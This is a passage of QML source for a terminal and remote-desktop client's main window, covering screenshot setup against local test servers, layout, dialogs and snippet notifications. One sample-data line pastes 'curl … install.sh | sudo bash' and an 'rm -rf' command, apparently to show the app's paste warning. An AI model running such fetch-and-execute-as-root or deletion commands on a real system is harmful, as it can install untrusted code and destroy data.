            // No session in screenshot runs: a sample state for the bar.
            if (currentTerminal)
                currentTerminal.playerState = { playing: true, position: 42, duration: 95, speed: 2 };
        } else {
            selectTabById(snippetsTab);
            showView("terminal");
            if (page === "picker") {
                showSnippetPicker();
            } else if (page === "paste" && currentTerminal) {
                const text = "curl -fsSL https://get.example.com/install.sh | sudo bash\nrm -rf ~/.cache/app/*\n"; // lint-qml: allow (sample data for screenshots)
                currentTerminal.terminal.pasteText(text);
            }
        }
    }

    // --screenshots: the other terminal kinds and S3 (Sprint 12), for real against their test
    // servers (a telnet server, a loopback serial port, an S3 server; never the network): a telnet
    // tab, a serial tab in hexadecimal, and S3 storage in the files view. `done` runs when they are
    // ready (or, with a warning, after 20 s).
    function prepareProtocolsScreenshots(done) {
        palette.close();
        notifications.close();
        sidePanelOpen = false;
        snippetPicker.close();
        if (currentWorkspace && currentWorkspace.askingToPaste)
            currentWorkspace.answerPaste(false);
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        if (AppInfo.startTelnetTestServer() <= 0 || AppInfo.startS3TestServer() <= 0) {
            console.warn("AppShell: no test servers for the protocol screenshots");
            done();
            return;
        }
        const screen = pane => pane ? pane.terminal.screenText().replace(/\n/g, "") : "";
        const deadline = Date.now() + 20000;
        let stage = "telnet";
        let pane = null;
        screenshotPoll.poll = () => {
            if (Date.now() > deadline) {
                console.warn("AppShell: the protocol screenshots' setup timed out at", stage);
                return true;
            }
            if (stage === "telnet") {
                if (!connectTarget("telnet://router.example:2323", "tab"))
                    return true;
                pane = currentTerminal;
                protocolTabs.telnet = currentTabId;
                stage = "telnet-prompt";
            } else if (stage === "telnet-prompt") {
                if (screen(pane).indexOf("test>") < 0)
                    return false;
                pane.terminal.sendText("size\r");
                if (!connectTarget("serial://COM3?baud=9600", "tab"))
                    return true;
                pane = currentTerminal;
                protocolTabs.serial = currentTabId;
                stage = "serial";
            } else if (stage === "serial") {
                if (screen(pane).indexOf("test device") < 0)
                    return false;
                pane.terminal.sendText("AT\r");
                stage = "serial-echo";
            } else if (stage === "serial-echo") {
                if (screen(pane).indexOf("AT") < 0)
                    return false;
                pane.terminal.serialCommand("hex", true);
                pane.terminal.sendText("ATI\r");
                stage = "serial-hex";
            } else if (stage === "serial-hex") {
                if (screen(pane).indexOf("|ATI.|") < 0)
                    return false;
                showView("sftp");
                const sftp = sftpLoader.item;
                if (!sftp)
                    return true;
                sftp.setSource(1, { mode: "remote", hostId: "", target: "s3://backup@nas.lan:9000/media", title: qsTr("NAS (RustFS)") }); // lint-qml: allow (a quick-connect URL)
                stage = "s3";
            } else if (stage === "s3") {
                const sftp = sftpLoader.item;
                const right = sftp ? sftp.pane(1) : null;
                return right !== null && right.ready && right.browser.rowOf("photos") >= 0;
            }
            return false;
        };
        screenshotPoll.done = done;
        screenshotPoll.start();
    }

    // --screenshots: remote desktops, made for real against the RDP test server next to the app
    // and the in-process VNC test server (never the network): a connected RDP desktop, a second
    // tab waiting on the server's certificate, and a VNC desktop. `done` runs when they are ready
    // (or, with a warning, after 20 s).
    function prepareDesktopScreenshots(done) {
        palette.close();
        notifications.close();
        hostEditor.close();
        sidePanelOpen = false;
        while (sessionModel.count > 0)
            removeTab(sessionModel.count, false);
        if (AppInfo.startRdpTestServer() <= 0 || AppInfo.startVncTestServer() <= 0) {
            console.warn("AppShell: no RDP test server for the remote desktop screenshots (cargo xtask rdp --test-server)");
            done();
            return;
        }
        const deadline = Date.now() + 20000;
        let stage = "desktop";
        let rdp = null;
        const answered = {};
        // The password always; the certificate on every desktop but the one left asking.
        const answer = trustCertificate => {
            const question = rdp && rdp.prompt.length > 0 ? JSON.parse(rdp.prompt) : {};
            if (question.id === undefined || answered[stage + question.id])
                return;
            if (question.kind === "password") {
                answered[stage + question.id] = true;
                rdp.answerPrompt(question.id, "submit", ["right password"]); // lint-qml: allow (the test server's password)
            } else if (question.kind === "hostKey" && trustCertificate) {
                answered[stage + question.id] = true;
                rdp.answerPrompt(question.id, "trust-once", []);
            }
        };
        const open = text => {
            if (!connectTarget(text, "tab"))
                return false;
            const pane = currentTerminal;
            rdp = pane && pane.desktopView ? pane.desktopView.desktop : null;
            return rdp !== null;
        };
        screenshotPoll.poll = () => {
            if (Date.now() > deadline) {
                console.warn("AppShell: the remote desktop screenshots' setup timed out at", stage);
                return true;
            }
            if (stage === "desktop") {
                if (!open("rdp://tester@win11.example")) // lint-qml: allow (a quick-connect URL)
                    return true;
                desktopTabs.desktop = currentTabId;
                stage = "desktop-up";
            } else if (stage === "desktop-up") {
                answer(true);
                if (!rdp.running || rdp.desktopWidth === 0)
                    return false;
                if (!open("rdp://tester@build-pc.example")) // lint-qml: allow (a quick-connect URL)
                    return true;
                desktopTabs.certificate = currentTabId;
                stage = "certificate";
            } else if (stage === "certificate") {
                answer(false);
                const question = rdp.prompt.length > 0 ? JSON.parse(rdp.prompt) : {};
                if (question.kind !== "hostKey")
                    return false;
                if (!open("vnc://tester@office-pc.example")) // lint-qml: allow (a quick-connect URL)
                    return true;
                desktopTabs.vnc = currentTabId;
                stage = "vnc";
            } else if (stage === "vnc") {
                answer(true);
                return rdp.running && rdp.desktopWidth > 0;
            }
            return false;
        };
        screenshotPoll.done = done;
        screenshotPoll.start();
    }

    // --screenshots: a connected remote desktop ("desktop"), one asking about its certificate
    // ("certificate"), a VNC desktop ("vnc"), and the host editor of an RDP and a VNC host
    // ("editor", "vnceditor").
    function prepareDesktopScreenshot(page) {
        hostEditor.close();
        palette.close();
        if (page === "desktop") {
            selectTabById(desktopTabs.desktop);
        } else if (page === "certificate") {
            selectTabById(desktopTabs.certificate);
        } else if (page === "vnc") {
            selectTabById(desktopTabs.vnc);
        } else if (page === "vnceditor") {
            showView("hosts");
            hostEditor.create("");
            const fields = {
                name: qsTr("Lab workstation"),
                protocol: "vnc",
                address: "lab-07.lan", // lint-qml: allow (sample data for screenshots)
                "vnc.quality": "medium",
                "vnc.read_only": true
            };
            for (const key of Object.keys(fields))
                hostEditor.setValue(key, fields[key]);
            hostEditor.loaded();
            hostEditor.section = 0;
        } else if (page === "editor") {
            showView("hosts");
            hostEditor.create("");
            const fields = {
                name: qsTr("Office desktop"),
                protocol: "rdp",
                address: "win11.office.lan", // lint-qml: allow (sample data for screenshots)
                user: "operator", // lint-qml: allow (sample data for screenshots)
                "rdp.domain": "OFFICE", // lint-qml: allow (sample data for screenshots)
                "rdp.scaling": "fit",
                "rdp.resolution": "1920x1080" // lint-qml: allow (sample data for screenshots)
            };
            for (const key of Object.keys(fields))
                hostEditor.setValue(key, fields[key]);
            hostEditor.loaded();
            hostEditor.section = 0;
        }
    }

    // --screenshots: the new tab menu with the shells ("newtab"), the telnet and serial tabs, S3
    // in the files view, and the host editor of a serial and an S3 host.
    function prepareProtocolScreenshot(page) {
        hostEditor.close();
        palette.close();
        shellMenuRequested(false);
        if (page === "newtab" || page === "telnet") {
            selectTabById(protocolTabs.telnet);
            if (page === "newtab")
                shellMenuRequested(true);
        } else if (page === "serial") {
            selectTabById(protocolTabs.serial);
        } else if (page === "s3") {
            showView("sftp");
        } else if (page === "serialeditor" || page === "s3editor") {
            showView("hosts");
            hostEditor.create("");
            const fields = page === "serialeditor" ? {
                name: qsTr("Core switch console"),
                protocol: "serial",
                address: Qt.platform.os === "windows" ? "COM3" : "/dev/ttyUSB0", // lint-qml: allow (sample data for screenshots)
                "serial.baud": 9600,
                "serial.newline": "crlf"
            } : {
                name: qsTr("NAS backups"),
                protocol: "s3",
                address: "http://nas.lan:9000", // lint-qml: allow (sample data for screenshots)
                user: "backup-writer", // lint-qml: allow (sample data for screenshots)
                "s3.region": "eu-west-1" // lint-qml: allow (sample data for screenshots)
            };
            for (const key of Object.keys(fields))
                hostEditor.setValue(key, fields[key]);
            hostEditor.loaded();
            hostEditor.section = page === "serialeditor" ? 2 : 0;
        }
    }

    // --screenshots: the Keychain view with sample entries at section `page`, or the unlock
    // dialog over it.
    function prepareKeychainScreenshot(page) {
        closeHostDialogs();
        closeKeychainDialogs();
        if (!keychainSampleLoaded) {
            keychainSampleLoaded = true;
            Keychain.loadSample();
        }
        showView("keychain");
        const keychain = keychainLoader.item;
        if (keychain)
            keychain.showSection(page === "unlock" ? "identities" : page);
        if (page === "unlock")
            unlockDialog.show(null);
    }

    // Shows Settings at `section` (e.g. "terminal").
    function openSettings(section) {
        const main = forwardToMain();
        if (main) {
            main.openSettings(section);
            return;
        }
        showView("settings");
        const settings = settingsLoader.item;
        if (settings && typeof settings.showSection === "function")
            settings.showSection(section);
    }

    function prepareSettingsScreenshot(page) {
        showView("settings");
        const settings = settingsLoader.item;
        if (settings && typeof settings.showSection === "function")
            settings.showSection(page && page.length > 0 ? page : "appearance");
    }

    Component.onCompleted: {
        WindowRegistry.register(shell);
        if (detached)
            return;
        const stored = UiState.activeView;
        const view = viewIds.indexOf(stored) >= 0 ? stored : "hosts";
        activeView = view;
        if (view !== "terminal")
            homeView = view;
        sidePanelOpen = UiState.sidePanelOpen;
        sidePanelWidth = Math.max(sidePanelMinimumWidth, Math.min(1200, UiState.sidePanelWidth));
    }
    Component.onDestruction: WindowRegistry.unregister(shell)

    onSidePanelLeftChanged: syncSidePanelWidth()

    // --screenshots: runs `poll` every 100 ms until it returns true, then `done`.
    Timer {
        id: screenshotPoll

        property var poll: null
        property var done: null

        interval: 100
        repeat: true
        onTriggered: {
            if (poll && !poll())
                return;
            stop();
            if (done)
                done();
        }
    }

    // UiState.save() is debounced off the GUI thread too; this only batches a drag.
    Timer {
        id: saveTimer

        interval: 400
        onTriggered: UiState.save()
    }

    // A snippet stopped in a pane (or before any): say why.
    Connections {
        target: Snippets
        enabled: !shell.detached

        function onRunEnded(id, pane, code, detail) {
            if (code.length === 0)
                return;
            const snippet = JSON.parse(Snippets.list || "[]").find(entry => entry.id === id);
            const name = snippet ? snippet.name : "";
            switch (code) {
            case "gone":
                Toasts.show(qsTr("%1 stopped: its pane closed.").arg(name), "warning");
                break;
            case "timeout":
                Toasts.show(qsTr("%1 stopped: “%2” didn't appear in time.").arg(name).arg(detail), "warning");
                break;
            case "secret-locked":
                Toasts.show(qsTr("%1 needs the password of %2: unlock the vault first.").arg(name).arg(detail), "warning");
                break;
            case "secret-unknown":
                Toasts.show(qsTr("%1: the keychain has no identity called %2.").arg(name).arg(detail), "danger");
                break;
            case "no-secret":
                Toasts.show(qsTr("%1: the identity %2 has no password.").arg(name).arg(detail), "danger");
                break;
            default:
                Toasts.show(qsTr("%1 stopped: %2 has no value.").arg(name).arg(detail), "warning");
                break;
            }
        }
    }

    // Each snippet's own shortcut.
    Instantiator {
        model: shell.detached ? [] : JSON.parse(Snippets.list || "[]").filter(entry => entry.shortcut.length > 0)

        delegate: Shortcut {
            required property var modelData

            sequence: modelData.shortcut
            context: Qt.WindowShortcut
            onActivated: shell.runSnippet(modelData.id, "auto")
        }
    }

    SnippetEditorDialog {
        id: snippetEditor
    }

    CloseConfirmDialog {
        id: closeDialog

        onConfirmed: {
            shell.window.closeConfirmed = true;
            shell.window.close();
        }
    }

    SnippetRunDialog {
        id: snippetRunDialog
    }

    SnippetPicker {
        id: snippetPicker
    }

    // A tunnel that connects out of sight (one that started with OpenSesh) asks something: say
    // so, unless the Tunnels view, where its row has an Answer button, is in front.
    Connections {
        target: Tunnels
        enabled: !shell.detached

        function onNeedsAnswer(id, name) {
            if (shell.currentTab !== 0 || shell.activeView !== "tunnels")
                Toasts.show(qsTr("The tunnel %1 needs an answer to connect: see Tunnels.").arg(name), "warning");
        }
    }

    ListModel {
        id: sessionModel
    }

    ColumnLayout {
        anchors.fill: parent
        spacing: 0

        Column {
            id: titleRegion

            Layout.fillWidth: true

            TitleBar {
                width: parent.width
                window: shell.window
                shell: shell
                showTabs: shell.tabsPosition !== "below_title_bar"
                frameless: shell.frameless
                showWindowButtons: shell.decorations === "custom"
            }

            // Tabs in their own row (tabsPosition "below_title_bar").
            Rectangle {
                width: parent.width
                height: Theme.titleBarHeight
                visible: shell.tabsPosition === "below_title_bar"
                color: Theme.bg

                Loader {
                    anchors.left: parent.left
                    anchors.leftMargin: Theme.spacingSm
                    anchors.right: parent.right
                    anchors.rightMargin: Theme.spacingSm
                    anchors.verticalCenter: parent.verticalCenter
                    active: parent.visible

                    sourceComponent: SessionTabStrip {
                        shell: shell
                        newTabShortcut: shell.shortcutText("tab.newLocal")
                    }
                }

                Rectangle {
                    anchors.bottom: parent.bottom
                    width: parent.width
                    height: Theme.borderWidth
                    color: Theme.border
                }
            }
        }

        Item {
            id: body

            Layout.fillWidth: true
            Layout.fillHeight: true

            OsRail {
                id: rail

                readonly property bool onRight: shell.railPosition === "right"

                x: onRight ? body.width - width : 0
                width: implicitWidth
                height: body.height
                visible: shell.railPosition !== "hidden"
                showLabels: shell.railLabels
                // A right-hand rail puts its edge line on the left. Without labels it is the
                // full mirror image (selection bar on the outer edge, tooltips to the left); with
                // labels the entries stay left to right so the text reads normally.
                LayoutMirroring.enabled: onRight
                LayoutMirroring.childrenInherit: !showLabels
                model: [
                    { id: "hosts", text: qsTr("Hosts"), iconName: "server" },
                    { id: "terminal", text: qsTr("Terminal"), iconName: "square-terminal" },
                    { id: "sftp", text: qsTr("SFTP"), iconName: "folder-sync" },
                    { id: "tunnels", text: qsTr("Tunnels"), iconName: "waypoints" },
                    { id: "snippets", text: qsTr("Snippets"), iconName: "scroll-text" },
                    { id: "keychain", text: qsTr("Keychain"), iconName: "key-round" },
                    { id: "history", text: qsTr("History"), iconName: "history" }
                ]
                footerModel: [
                    { id: "settings", text: qsTr("Settings"), iconName: "settings" }
                ]

                onActivated: id => id === "terminal" ? shell.openTerminal() : shell.showView(id)
                onVisibleChanged: {
                    if (!visible)
                        shell.moveFocusOffHiddenItem();
                }

                // OsRail assigns currentId itself when activated; keep it following the shell.
                Binding on currentId {
                    value: shell.currentTab > 0 ? "terminal" : shell.activeView
                }
            }

            OsSplitter {
                id: splitter

                x: rail.visible && !rail.onRight ? rail.width : 0
                width: body.width - (rail.visible ? rail.width : 0)
                height: body.height

                // Side panel slot on the left (sidePanelPosition "left").
                Item {
                    id: leftSlot

                    visible: shell.sidePanelOpen && shell.sidePanelLeft
                    T.SplitView.preferredWidth: shell.sidePanelWidth
                    T.SplitView.minimumWidth: shell.sidePanelMinimumWidth
                    T.SplitView.maximumWidth: Math.max(shell.sidePanelMinimumWidth,
                                                       Math.min(1200, splitter.width - shell.contentMinimumWidth))

                    onWidthChanged: shell.sidePanelSlotResized(leftSlot)
                }

                Item {
                    id: contentArea

                    // Views never paint over the side panel when the window is narrow.
                    clip: true
                    T.SplitView.fillWidth: true
                    T.SplitView.minimumWidth: shell.contentMinimumWidth

                    StackLayout {
                        anchors.fill: parent
                        visible: shell.currentTab === 0 && !shell.detached
                        currentIndex: Math.max(0, shell.viewIds.indexOf(shell.activeView))

                        ViewLoader {
                            id: hostsLoader

                            viewId: "hosts"
                            currentView: shell.activeView
                            sourceComponent: HostsView {}
                        }
                        ViewLoader {
                            viewId: "terminal"
                            currentView: shell.activeView
                            sourceComponent: TerminalView {}
                        }
                        ViewLoader {
                            id: sftpLoader

                            viewId: "sftp"
                            currentView: shell.activeView
                            sourceComponent: SftpView {}
                        }
                        ViewLoader {
                            id: tunnelsLoader

                            viewId: "tunnels"
                            currentView: shell.activeView
                            sourceComponent: TunnelsView {}
                        }
                        ViewLoader {
                            viewId: "snippets"
                            currentView: shell.activeView
                            sourceComponent: SnippetsView {}
                        }
                        ViewLoader {
                            id: keychainLoader

                            viewId: "keychain"
                            currentView: shell.activeView
                            sourceComponent: KeychainView {}
                        }
                        ViewLoader {
                            viewId: "history"
                            currentView: shell.activeView
                            sourceComponent: HistoryView {}
                        }
                        ViewLoader {
                            id: settingsLoader

                            viewId: "settings"
                            currentView: shell.activeView
                            sourceComponent: SettingsView {}
                        }
                    }

                    // One workspace per terminal tab; only the current one is visible.
                    Repeater {
                        id: tabRepeater

                        model: sessionModel

                        TabWorkspace {
                            anchors.fill: parent
                            shell: shell
                            edgeInset: shell.contentEdgeInset
                        }
                    }
                }

                // Side panel slot on the right (the default).
                Item {
                    id: rightSlot

                    visible: shell.sidePanelOpen && !shell.sidePanelLeft
                    T.SplitView.preferredWidth: shell.sidePanelWidth
                    T.SplitView.minimumWidth: shell.sidePanelMinimumWidth
                    T.SplitView.maximumWidth: Math.max(shell.sidePanelMinimumWidth,
                                                       Math.min(1200, splitter.width - shell.contentMinimumWidth))

                    onWidthChanged: shell.sidePanelSlotResized(rightSlot)
                }
            }

            SidePanel {
                id: sidePanel

                parent: shell.sidePanelLeft ? leftSlot : rightSlot
                anchors.fill: parent
                terminalPane: shell.currentTab > 0 ? shell.currentTerminal : null
                onCloseRequested: shell.setSidePanelOpen(false)
            }

            // Only the window in use shows new toasts (the main one until a window registers).
            OsToastHost {
                accepting: WindowRegistry.activeShell === shell || (WindowRegistry.activeShell === null && !shell.detached)
            }
        }

        StatusBar {
            id: statusBar

            Layout.fillWidth: true
            visible: shell.showStatusBar
            terminal: shell.currentTerminal ? shell.currentTerminal.terminal : null
            desktop: shell.currentTerminal && shell.currentTerminal.desktopView ? shell.currentTerminal.desktopView.desktop : null
            label: shell.currentTerminal ? shell.currentTerminal.label : ""
            workspace: shell.currentTab > 0 ? shell.currentWorkspace : null

            onMonitorClicked: {
                shell.setSidePanelOpen(true);
                sidePanel.currentIndex = 1;
            }
            onVisibleChanged: {
                if (!visible)
                    shell.moveFocusOffHiddenItem();
            }
        }
    }

    OsCommandPalette {
        id: palette

        topOffset: titleRegion.height + Theme.spacingLg
        shortcutText: action => shell.shortcutText(action.actionId)
        extraResults: query => shell.hostPaletteEntries(query).concat(shell.tunnelPaletteEntries(query))
                                     .concat(shell.shellPaletteEntries(query))
    }

    NotificationsPanel {
        id: notifications
    }

    TabSwitcher {
        id: switcher

        shell: shell
    }

    OsDialog {
        id: renameDialog

        property int index: 0

        function ask(name) {
            renameField.text = name;
            open();
            renameField.forceActiveFocus(Qt.OtherFocusReason);
            renameField.selectAll();
        }

        title: qsTr("Rename tab")
        acceptText: qsTr("Rename")

        onAccepted: shell.renameTab(index, renameField.text)

        Column {
            width: Math.min(Theme.spacingXxl * 12, renameDialog.maxWidth - renameDialog.leftPadding - renameDialog.rightPadding)
            spacing: Theme.spacingSm

            OsTextField {
                id: renameField

                width: parent.width
                placeholderText: qsTr("Tab name")
                onAccepted: renameDialog.accept()
            }

            OsText {
                width: parent.width
                text: qsTr("Leave it empty to show the terminal's own title.")
                muted: true
                wrapMode: Text.Wrap
                elide: Text.ElideNone
                horizontalAlignment: Text.AlignLeft
            }
        }
    }

    WorkspacesDialog {
        id: workspacesDialog
    }

    QuickConnectPopup {
        id: quickConnect

        shell: shell
    }

    HostEditorDialog {
        id: hostEditor

        shell: shell
    }

    GroupEditorDialog {
        id: groupEditor
    }

    SshConfigImportDialog {
        id: sshImport
    }

    InstallKeyDialog {
        id: installKeyDialog

        shell: shell
    }

    // Questions of the transfer queue and of remote edits: once, in the main window.
    Loader {
        active: !shell.detached
        sourceComponent: TransferQuestionDialog {}
    }

    Loader {
        active: !shell.detached
        sourceComponent: RemoteEditDialogs {}
    }

    UnlockDialog {
        id: unlockDialog

        onResetRequested: vaultResetDialog.show()
    }

    MasterPasswordDialog {
        id: masterPasswordDialog
    }

    VaultResetDialog {
        id: vaultResetDialog
    }

    IdentityEditorDialog {
        id: identityEditor

        shell: shell
    }

    KeyGenerateDialog {
        id: keyGenerateDialog

        shell: shell
    }

    KeyImportDialog {
        id: keyImportDialog

        shell: shell
    }

    KeyExportDialog {
        id: keyExportDialog

        shell: shell
    }

    ShortcutHost {
        id: shortcutHost
    }

    // Loads a view the first time it is shown and keeps it afterwards.
    component ViewLoader: Loader {
        required property string viewId
        property string currentView
        property bool keep: false

        active: keep || currentView === viewId
        // Not in onLoaded: that runs inside the `active` binding and would loop.
        onCurrentViewChanged: {
            if (currentView === viewId)
                keep = true;
        }
        Component.onCompleted: {
            if (currentView === viewId)
                keep = true;
        }
    }
}
